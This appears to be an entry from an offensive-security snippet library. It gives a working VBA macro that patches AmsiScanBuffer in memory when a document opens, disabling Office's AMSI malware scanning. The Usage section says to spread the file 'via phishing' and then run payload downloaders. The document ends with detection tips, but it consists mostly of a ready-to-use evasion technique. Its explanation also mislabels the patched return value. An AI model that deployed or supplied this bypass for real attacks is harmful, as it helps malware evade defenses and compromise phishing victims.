---
id: 1e1e9f01-be15-49f5-8bda-3f443bc81a94
name: VBA-AMSI-Bypass-Script
type: code
language: vb
verified: true
created_at: '2023-04-06T03:56:23.872446+00:00'
updated_at: '2023-04-10T20:36:59.496762+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - vba-macro
  - defense-evasion
validated: true
---

# VBA-AMSI-Bypass-Script

## Code

```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Private Sub Document_Open()
    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr

    MyByteArray(0) = 184 ' 0xB8
    MyByteArray(1) = 87  ' 0x57
    MyByteArray(2) = 0   ' 0x00
    MyByteArray(3) = 7   ' 0x07
    MyByteArray(4) = 128 ' 0x80
    MyByteArray(5) = 195 ' 0xC3

    ' Load the amsi.dll library
    AmsiDLL = LoadLibrary("amsi.dll")
    ' Get the address of the AmsiScanBuffer function
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    ' Change the memory protection of the AmsiScanBuffer function to allow writing
    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
    ' Copy the shellcode to the AmsiScanBuffer function
    ArrayPointer = VarPtr(MyByteArray(0))
    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
End Sub
```

## Description

This VBA code snippet patches the AmsiScanBuffer function in amsi.dll to always return AMSI_RESULT_CLEAN (0x80070057), bypassing AMSI scanning for VBA macros in Microsoft Office. It uses Windows API calls to load the DLL, find the function address, make the memory writable with VirtualProtect (PAGE_EXECUTE_READWRITE flag 64), and overwrite the function prologue with shellcode (mov eax, 0x80070057; ret). The code runs automatically on document open, enabling stealthy execution of malicious macros without altering global AMSI state.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | The shellcode bytes are hardcoded; no user-substitutable variables. Adjust byte array only for custom return values if needed. | N/A |

## Usage

Embed this code in the ThisDocument module of an Office file (e.g., Word .docm) via the VBA editor (Alt+F11). Save as macro-enabled format and distribute via phishing. Upon opening, Document_Open triggers the patch. Follow with malicious VBA, such as payload downloaders (e.g., URLDownloadToFile). Test in a lab with Defender enabled to confirm bypass. Used in red teaming for Office macro attacks or simulating APT macro delivery.

## Detection

- Monitor for LoadLibrary calls to amsi.dll from Office processes (winword.exe, excel.exe) via Sysmon Event ID 7 (ImageLoad).
- Detect VirtualProtect API usage on amsi.dll regions or unusual memory writes to AmsiScanBuffer (ETW providers for API monitoring).
- AMSI logs (Event ID 1 in Microsoft-Windows-Windows Defender/Operational) may show failed scans post-bypass.
- Behavioral: Office processes spawning network activity or shells after macro execution; use EDR tools like CrowdStrike or Carbon Black for anomaly detection.
- Static: Scan macros for API declarations like GetProcAddress or byte arrays matching known shellcode (0xB857000780C3).

## Related

- [[procedures/VBA-AMSI-Bypass-via-Memory-Patching]]
